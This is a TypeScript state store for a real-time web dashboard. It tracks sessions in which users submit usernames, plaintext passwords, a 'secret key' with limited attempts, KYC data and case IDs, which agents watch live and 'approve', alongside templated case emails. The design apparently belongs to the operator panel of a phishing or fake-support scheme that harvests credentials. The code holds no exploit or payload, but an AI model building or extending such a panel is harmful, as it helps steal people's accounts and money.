import { create } from "zustand"
import type { SocketClient } from "@/lib/ws/socket"



/**
 * Session Store
 *
 * Centralized state management for sessions with automatic WebSocket integration.
 * This store subscribes to WebSocket events and automatically updates session data
 * when the backend broadcasts changes.
 *
 * Message Types Handled:
 * - broadcast: session_created, session_updated, session_deleted
 * - user_status: credentials_submitted, secret_key_submitted, kyc_submitted
 * - verified_data: agent approval events
 */

export interface EmailLogData {
  id: number
  to_email: string
  subject: string
  status: "queued" | "sent" | "failed"
  template_name: string
  created_at: string
  sent_at?: string
  error_message?: string
}

export interface SessionData {
  uuid: string
  external_case_id: string
  agent: string  // Accepts both string (username fallback) and number (user ID from backend)
  agent_username: string
  stage: string
  status: string
  user_online: boolean
  notes?: string
  email_logs?: EmailLogData[]  // Email history for this session
  user_data?: {
    current_submission?: {
      stage: string
      data?: Record<string, any>
    }
    verified_data?: {
      credentials?: {
        username?: string
        password?: string
        verified_at?: string
        verified_by?: string
      }
      secret_key?: {
        secret_key?: string
        verified_at?: string
        verified_by?: string
        attempts_used?: number
        attempts_total?: number
      }
      kyc?: {
        status?: string
        verified_at?: string
        verified_by?: string
      }
    }
  }
  created_at: string
  updated_at: string
  lastUpdated: number
}

interface SessionStore {
  // State
  sessions: Map<string, SessionData>
  loading: boolean
  error: string | null

  // Actions
  addSession: (session: SessionData) => void
  updateSession: (uuid: string, data: Partial<SessionData>) => void
  removeSession: (uuid: string) => void
  setSessionList: (sessions: SessionData[]) => void
  setLoading: (loading: boolean) => void
  setError: (error: string | null) => void

  // Email actions
  addEmailLog: (uuid: string, emailLog: EmailLogData) => void
  updateEmailLog: (uuid: string, emailLogId: number, status: "sent" | "failed", error?: string) => void
  setEmailLogs: (uuid: string, emailLogs: EmailLogData[]) => void

  // Getters
  getSession: (uuid: string) => SessionData | undefined
  getSessions: () => SessionData[]
  getSessionsByStatus: (status: string) => SessionData[]
  getSessionsByAgent: (agent: string) => SessionData[]
}

export const useSessionStore = create<SessionStore>((set, get) => ({
  // Initial state
  sessions: new Map(),
  loading: false,
  error: null,

  // Actions
  addSession: (session: SessionData) =>
    set((state) => {
      const updated = new Map(state.sessions)
      const sessionWithTimestamp = {
        ...session,
        lastUpdated: session.lastUpdated || new Date(session.updated_at).getTime(),
      }
      updated.set(session.uuid, sessionWithTimestamp)
      return { sessions: updated }
    }),

  updateSession: (uuid: string, data: Partial<SessionData>) =>
    set((state) => {
      const existing = state.sessions.get(uuid)
      if (!existing) return state

      const updated = new Map(state.sessions)
      // Use controlled shallow merge instead of lodash.merge to properly handle empty objects
      const mergedSession = {
        ...existing,
        ...data,
        user_data: data.user_data
          ? {
              ...existing.user_data,
              ...data.user_data,
              // If current_submission is provided, replace it entirely (don't deep merge)
              current_submission: data.user_data.current_submission !== undefined
                ? data.user_data.current_submission
                : existing.user_data?.current_submission,
            }
          : existing.user_data
      }
      // Update lastUpdated to current time if not explicitly provided
      if (!data.lastUpdated) {
        mergedSession.lastUpdated = Date.now()
      }
      updated.set(uuid, mergedSession)
      return { sessions: updated }
    }),

  removeSession: (uuid: string) =>
    set((state) => {
      const updated = new Map(state.sessions)
      updated.delete(uuid)
      return { sessions: updated }
    }),

  setSessionList: (sessions: SessionData[]) =>
    set(() => {
      const map = new Map(
        sessions.map((s) => [
          s.uuid,
          {
            ...s,
            lastUpdated: s.lastUpdated || new Date(s.updated_at).getTime(),
          },
        ])
      )
      return { sessions: map }
    }),

  setLoading: (loading: boolean) => set({ loading }),

  setError: (error: string | null) => set({ error }),

  // Email actions
  addEmailLog: (uuid: string, emailLog: EmailLogData) =>
    set((state) => {
      const existing = state.sessions.get(uuid)
      if (!existing) return state

      const updated = new Map(state.sessions)
      const session = { ...existing }
      session.email_logs = [...(session.email_logs || []), emailLog]
      updated.set(uuid, session)
      return { sessions: updated }
    }),

  updateEmailLog: (uuid: string, emailLogId: number, status: "sent" | "failed", error?: string) =>
    set((state) => {
      const existing = state.sessions.get(uuid)
      if (!existing) return state

      const updated = new Map(state.sessions)
      const session = { ...existing }
      if (session.email_logs) {
        session.email_logs = session.email_logs.map((log) =>
          log.id === emailLogId
            ? {
                ...log,
                status,
                sent_at: status === "sent" ? new Date().toISOString() : log.sent_at,
                error_message: error || undefined,
              }
            : log
        )
      }
      updated.set(uuid, session)
      return { sessions: updated }
    }),

  setEmailLogs: (uuid: string, emailLogs: EmailLogData[]) =>
    set((state) => {
      const existing = state.sessions.get(uuid)
      if (!existing) return state

      const updated = new Map(state.sessions)
      const session = { ...existing }
      session.email_logs = emailLogs
      updated.set(uuid, session)
      return { sessions: updated }
    }),

  // Getters
  getSession: (uuid: string) => get().sessions.get(uuid),

  getSessions: () => Array.from(get().sessions.values()),

  getSessionsByStatus: (status: string) =>
    Array.from(get().sessions.values()).filter((s) => s.status === status),

  getSessionsByAgent: (agent: string) =>
    Array.from(get().sessions.values()).filter(
      (s) => s.agent === agent || s.agent_username === agent
    ),
}))

/**
 * Initialize WebSocket subscriptions for the store
 *
 * This function should be called once in the WebSocketProvider
 * to set up automatic store updates from WebSocket events.
 */
export function initializeStoreWebSocketSubscriptions(
  subscribe: (type: string, cb: (msg: any) => void) => () => void
) {
  let unsubscribers: Array<() => void> = []

  // Subscribe to broadcast events (CRUD operations)
  unsubscribers.push(
    subscribe("broadcast", (message: any) => {
      const event = message.event
      const data = message.data

      if (!data?.uuid) return

      console.log(`[WS:broadcast] ${event}`, { uuid: data.uuid, user_data: data.user_data })

      if (event === "session_created") {
        useSessionStore.getState().addSession(data)
      } else if (event === "session_updated") {
        console.log(`[WS:session_updated] Current state before merge:`, useSessionStore.getState().getSession(data.uuid)?.user_data?.current_submission)
        useSessionStore.getState().updateSession(data.uuid, data)
        console.log(`[WS:session_updated] State after merge:`, useSessionStore.getState().getSession(data.uuid)?.user_data?.current_submission)
      } else if (event === "session_deleted") {
        useSessionStore.getState().removeSession(data.uuid)
      }
    })
  )
  /*
  // Subscribe to user_status events (user submissions)
  unsubscribers.push(
    subscribe("user_status", (message: any) => {
      const uuid = message.uuid
      if (!uuid) return

      console.log(`[WS:user_status] ${message.status}`, { uuid, data: message.data })

      const session = useSessionStore.getState().getSession(uuid)
      if (!session) return

      // Update current_submission with user-submitted data
      const user_data = session.user_data || {}

      // Clear submission when stage verification completes (e.g., case_id_verified)
      // This prevents stale submission data from appearing on subsequent stages
      if (message.status === "case_id_verified") {
        console.log(`[WS:user_status] Clearing submission for case_id_verified`)
        user_data.current_submission = undefined
      }
      // Handle kyc_started and kyc_submitted - backend sends properly structured payload
      // Use message.data directly (already has { stage, data } structure)
      else if ((message.status === "kyc_started" || message.status === "kyc_submitted") && message.data) {
        console.log(`[WS:user_status] Setting KYC submission to:`, message.data)
        user_data.current_submission = message.data
      }
      // Update with actual submitted data from user
      // Only process specific submission statuses, not generic events like 'connected'
      else if (['credentials_submitted', 'secret_key_submitted', 'case_id_submitted'].includes(message.status)
               && message.data
               && Object.keys(message.data).length > 0) {
        console.log(`[WS:user_status] Setting submission to:`, message.data)
        user_data.current_submission = message.data
      }

      console.log(`[WS:user_status] About to update with user_data:`, user_data)
      useSessionStore.getState().updateSession(uuid, { user_data })
    })
  )
  */


  // Replace your existing subscribe("user_status", ...) handler with this block.

  const _recentStatusDedupe = new Map<string, number>();

  unsubscribers.push(
    subscribe("user_status", (rawMessage: any) => {
      try {
        // Snapshot to avoid console-live-object expansion confusion
        const message = JSON.parse(JSON.stringify(rawMessage));
        const uuid = message.uuid;
        if (!uuid) return;

        // Short dedupe window to ignore quick duplicate emissions
        const status = message.status || "unknown_status";
        const dedupeKey = `${uuid}::${status}`;
        const now = Date.now();
        const last = _recentStatusDedupe.get(dedupeKey) || 0;
        if (now - last < 200) {
          console.warn(`[WS:user_status] Ignored duplicate event within 200ms: ${dedupeKey}`);
          return;
        }
        _recentStatusDedupe.set(dedupeKey, now);

        // Helpful snapshot log + trace
        console.log(`[WS:user_status] snapshot: ${new Date().toISOString()}`, { uuid, status, data: message.data });
        console.trace && console.trace(`[WS:user_status] trace for status=${status}`);

        const session = useSessionStore.getState().getSession(uuid);
        if (!session) {
          // not loaded in store yet - ignore or optionally queue
          console.warn(`[WS:user_status] Received update for unknown session ${uuid}`);
          return;
        }

        // Helper: attempt to detect & normalize many shapes into { stage, data }
        function normalizeSubmission(msg: any, sessionFallbackStage?: string) {
          const raw = msg?.data;
          if (!raw) return null;

          // If it's already correct: { stage, data }
          if (typeof raw === "object" && raw !== null && "stage" in raw && "data" in raw) {
            // handle accidental triple-nesting: data.data -> unwrap once
            let d = raw.data;
            if (d && typeof d === "object" && "data" in d && typeof d.data === "object") {
              d = d.data;
            }
            return { stage: raw.stage, data: d };
          }

          // Case: message.data = { data: { stage, data } } (double-wrapped)
          if (typeof raw === "object" && raw !== null && "data" in raw && typeof raw.data === "object" && "stage" in raw.data) {
            let inner = raw.data;
            let d = inner.data;
            if (d && typeof d === "object" && "data" in d) d = d.data; // extra layer
            return { stage: inner.stage, data: d };
          }

          // Fallback: raw is a plain object that looks like submission fields (e.g., { secret_key: 'x' } or credentials)
          // Infer stage from message.status if possible, else session.stage
          const inferredStage = (msg.status && String(msg.status).replace(/_submitted$/i, "")) || sessionFallbackStage || session?.stage || "unknown";

          // If the raw object already has a { stage } key but not in expected place, be conservative
          if (typeof raw === "object" && raw !== null && "stage" in raw && !("data" in raw)) {
            // Example malformed: { stage: 'secret_key', secret_key: '123' } -> convert to proper shape
            const copy = { ...raw };
            const maybeStage = copy.stage;
            delete copy.stage;
            return { stage: maybeStage, data: copy };
          }

          // Last fallback: wrap raw under inferred stage
          if (typeof raw === "object" && raw !== null) {
            return { stage: inferredStage, data: raw };
          }

          return null;
        }

        const normalized = normalizeSubmission(message, session.stage);

        // Logging for visibility
        if (!normalized) {
          console.warn(`[WS:user_status] No usable submission data for ${uuid} (status=${status})`, message.data);
        } else {
          // If normalized differs from message.data shape, log normalization
          const wasShapeDifferent = (() => {
            try {
              const s = JSON.stringify(message.data);
              const n = JSON.stringify(normalized);
              return s !== n;
            } catch {
              return true;
            }
          })();

          if (wasShapeDifferent) {
            console.warn(`[WS:user_status] Normalized submission for ${uuid} (status=${status}) ->`, normalized);
          }
        }

        // Now apply behavior based on status, while using normalized for setting current_submission
        const user_data = session.user_data ? { ...session.user_data } : {};

        // Clear submission for certain verified statuses
        if (message.status === "case_id_verified") {
          user_data.current_submission = undefined;
          useSessionStore.getState().updateSession(uuid, { user_data });
          return;
        }

        // For kyc, credentials, secret_key, case_id submissions, set the normalized submission if present
        if (['kyc_started','kyc_submitted','credentials_submitted','secret_key_submitted','case_id_submitted'].includes(message.status)) {
          if (normalized) {
            user_data.current_submission = normalized;
            console.log(`[WS:user_status] Applying normalized submission for ${uuid}:`, normalized);
            useSessionStore.getState().updateSession(uuid, { user_data });
          } else {
            // fallback safety: don't overwrite if nothing sensible
            console.warn(`[WS:user_status] Skipping update for ${uuid} due to no normalized submission`);
          }
          return;
        }

        // For any other user_status updates, don't change current_submission by default
        // but you can handle other statuses here as needed.
      } catch (err) {
        console.error("[WS:user_status] handler error", err);
      }
    })
  );





  // Subscribe to verified_data events (agent approvals)
  unsubscribers.push(
    subscribe("verified_data", (message: any) => {
      const uuid = message.uuid
      if (!uuid) return

      const session = useSessionStore.getState().getSession(uuid)
      if (!session) return

      // Merge verified data from agent approval
      const user_data = session.user_data || {}
      user_data.verified_data = {
        ...user_data.verified_data,
        ...message.data,
      }

      // Clear current_submission when verified_data is received
      // This ensures the pending state disappears when agent accepts
      // TypeScript type definition requires current_submission to have a stage property if it's an object
      // Using undefined properly indicates "no current submission"
      // Components already check for currentSubmission?.stage, so undefined works correctly
      user_data.current_submission = undefined

      useSessionStore.getState().updateSession(uuid, { user_data })
    })
  )

  // Subscribe to email_queued events (email sent to queue)
  unsubscribers.push(
    subscribe("email_queued", (message: any) => {
      const sessionUuid = message.data?.session_uuid
      if (!sessionUuid) return

      console.log(`[WS:email_queued]`, { sessionUuid, to_email: message.data?.to_email })

      // Create email log entry
      const emailLog: EmailLogData = {
        id: message.data?.email_log_id || Date.now(),
        to_email: message.data?.to_email || "",
        subject: `${message.data?.template_name || "Email"} - ${message.data?.case_id || ""}`,
        status: "queued",
        template_name: message.data?.template_name || "",
        created_at: new Date().toISOString(),
      }

      useSessionStore.getState().addEmailLog(sessionUuid, emailLog)
    })
  )

  // Subscribe to email_sent events (email successfully delivered)
  unsubscribers.push(
    subscribe("email_sent", (message: any) => {
      const sessionUuid = message.data?.session_uuid
      const emailLogId = message.data?.email_log_id

      if (!sessionUuid || !emailLogId) return

      console.log(`[WS:email_sent]`, { sessionUuid, emailLogId })

      useSessionStore.getState().updateEmailLog(sessionUuid, emailLogId, "sent")
    })
  )

  // Subscribe to email_failed events (email delivery failed)
  unsubscribers.push(
    subscribe("email_failed", (message: any) => {
      const sessionUuid = message.data?.session_uuid
      const emailLogId = message.data?.email_log_id
      const errorMessage = message.data?.error_message

      if (!sessionUuid || !emailLogId) return

      console.log(`[WS:email_failed]`, { sessionUuid, emailLogId, error: errorMessage })

      useSessionStore.getState().updateEmailLog(sessionUuid, emailLogId, "failed", errorMessage)
    })
  )

  // Return cleanup function
  return () => {
    unsubscribers.forEach((unsub) => unsub())
  }
}
